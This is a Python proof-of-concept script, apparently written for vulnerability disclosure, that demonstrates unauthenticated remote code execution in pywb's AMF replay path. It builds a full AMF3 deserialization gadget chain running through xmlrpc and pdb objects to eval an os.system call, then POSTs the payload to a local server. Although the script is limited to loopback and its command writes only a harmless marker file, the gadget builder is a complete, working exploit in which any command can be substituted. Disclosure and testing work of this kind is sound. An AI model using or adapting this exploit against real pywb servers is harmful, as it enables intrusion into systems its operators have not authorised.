#!/usr/bin/env python3
"""Localhost-only default-config pywb PyAMF RCE proof of concept.

What this demonstrates:
    An unauthenticated AMF3 replay POST reaches py3AMF class deserialization
    before archive lookup and executes a fixed, harmless os.system() command.
    No valid capture, recorder configuration, live origin, or pre-planted files
    is required.

Validated environment:
    pywb 2.11.0, Python 3.14.10, py3AMF 0.9.1.

Install and run from the repository root:
    python -m venv .venv
    .venv/bin/pip install -r requirements.txt requests
    PYTHONPATH=. .venv/bin/python pocs/amf_poc.py

Expected result:
    [+] DEFAULT-CONFIG AMF OS-SYSTEM RCE CONFIRMED: .../amf-rce-proof.txt
    [+] Marker contents: pywb-amf-rce
    [+] Server stopped; temporary evidence cleaned up

The final HTTP 404 occurs during archive lookup after command execution and
therefore does not indicate failure. The script starts a real loopback server,
accepts no target or command arguments, and removes temporary evidence after
successful verification. Do not modify it to target systems you do not own or
have permission to test.
"""

from gevent.monkey import patch_all

patch_all()

import shlex
import tempfile
import time
from pathlib import Path

import requests

from pywb.apps.frontendapp import FrontEndApp
from pywb.utils.geventserver import GeventServer, RequestURIWSGIHandler


class Obj:
    def __init__(self, alias, **attrs):
        self.alias = alias
        self.attrs = attrs

    def serialize(self):
        # Inline dynamic AMF3 object with zero static attributes.
        out = b"\x0a\x0b" + amf3_string(self.alias, typed=False)
        for name, value in self.attrs.items():
            out += amf3_string(name, typed=False) + amf3_value(value)
        return out + b"\x01"


def u29(value):
    if not 0 <= value <= 0x1FFFFFFF:
        raise ValueError("outside U29 range")
    if value < 0x80:
        return bytes([value])
    if value < 0x4000:
        return bytes([0x80 | (value >> 7), value & 0x7F])
    if value < 0x200000:
        return bytes(
            [
                0x80 | ((value >> 14) & 0x7F),
                0x80 | ((value >> 7) & 0x7F),
                value & 0x7F,
            ]
        )
    return bytes(
        [
            0x80 | ((value >> 21) & 0x7F),
            0x80 | ((value >> 14) & 0x7F),
            0x80 | ((value >> 7) & 0x7F),
            value & 0xFF,
        ]
    )


def amf3_string(value, typed=True):
    data = value.encode("utf-8")
    prefix = b"\x06" if typed else b""
    return prefix + u29((len(data) << 1) | 1) + data


def amf3_value(value):
    if isinstance(value, Obj):
        return value.serialize()
    if value is None:
        return b"\x01"
    if value is True:
        return b"\x03"
    if value is False:
        return b"\x02"
    if isinstance(value, int):
        if value < 0:
            raise ValueError("only nonnegative integers are needed")
        return b"\x04" + u29(value)
    if isinstance(value, str):
        return amf3_string(value)
    raise TypeError(f"unsupported value: {value!r}")


def remoting_utf(value):
    data = value.encode("utf-8")
    return len(data).to_bytes(2, "big") + data


def build_packet(expression):
    # Empty aliases become ASObject dictionaries suitable for eval globals and
    # locals. Foo is only a container for the synthetic frame attributes.
    synthetic_curframe = Obj(
        "pyamf.adapters._weakref.Foo",
        f_globals=Obj(""),
        f_locals=Obj(""),
    )
    pdb = Obj(
        "pdb.Pdb",
        curframe=synthetic_curframe,
        curframe_locals=Obj(""),
        stdout=None,
    )
    service_wrapper = Obj(
        "pyamf.remoting.gateway.ServiceWrapper",
        service=pdb,
    )
    inner_method = Obj(
        "xmlrpc.client._Method",
        _Method__send=service_wrapper,
        _Method__name="do_break",
    )
    outer_method = Obj(
        "xmlrpc.client._Method",
        _Method__send=inner_method,
        _Method__name=expression,
    )
    graph = Obj(
        "pyamf.util.pure.BytesIOProxy",
        _len_changed=True,
        _len=0,
        _get_len=outer_method,
    )

    body = b"\x11" + graph.serialize()
    return (
        b"\x00\x03"  # AMF3 remoting envelope
        + b"\x00\x00"  # zero headers
        + b"\x00\x01"  # one body
        + remoting_utf("c")
        + remoting_utf("b")
        + len(body).to_bytes(4, "big")
        + body
    )


def run_ctf(lab: Path) -> None:
    config = lab / "config.yaml"
    collections = lab / "collections"
    marker = lab / "amf-rce-proof.txt"
    config.write_text("debug: false\n", encoding="utf-8")
    (collections / "test").mkdir(parents=True)

    # No recorder section, no custom filename template, no captures, and no
    # pre-planted payload files: this is the ordinary replay AMF request path.
    app = FrontEndApp(
        config_file=str(config),
        custom_config={"collections_root": str(collections)},
    )
    server = GeventServer(
        app,
        port=0,
        hostname="127.0.0.1",
        handler_class=RequestURIWSGIHandler,
    )
    print(f"[+] Loopback default-replay CTF server: {server.port}")

    try:
        # Pdb.do_break treats a comma as the start of a breakpoint condition,
        # so the evaluated expression deliberately contains no comma.
        command = "printf 'pywb-amf-rce\\n' > " + shlex.quote(str(marker))
        expression = "__import__('os').system(" + repr(command) + ")"
        packet = build_packet(expression)
        print(f"[+] Sending {len(packet)}-byte AMF3 remoting gadget")

        session = requests.Session()
        session.trust_env = False
        try:
            response = session.post(
                f"http://127.0.0.1:{server.port}/test/mp_/http://example.invalid/",
                data=packet,
                headers={"Content-Type": "application/x-amf"},
                timeout=5,
            )
            print(f"[+] Replay POST returned HTTP {response.status_code}")
        except requests.RequestException as exc:
            # Later request/archive processing may fail after eval has already
            # produced the marker. Only the marker determines success.
            print(f"[+] Post-evaluation request error (non-fatal): {exc}")

        for _ in range(20):
            if marker.exists():
                break
            time.sleep(0.05)
        if not marker.is_file():
            raise RuntimeError("AMF RCE canary was not created")
        proof = marker.read_text(encoding="utf-8")
        if proof != "pywb-amf-rce\n":
            raise RuntimeError(f"Unexpected canary contents: {proof!r}")
        print(f"[+] DEFAULT-CONFIG AMF OS-SYSTEM RCE CONFIRMED: {marker}")
        print(f"[+] Marker contents: {proof.strip()}")
    finally:
        server.stop()
        app.warcserver_server.stop()


def main() -> None:
    Path(tempfile.gettempdir()).mkdir(parents=True, exist_ok=True)
    with tempfile.TemporaryDirectory(
        prefix="pywb-amf-rce-ctf-", dir="/tmp/opencode"
    ) as directory:
        run_ctf(Path(directory))
    print("[+] Server stopped; temporary evidence cleaned up")


if __name__ == "__main__":
    main()
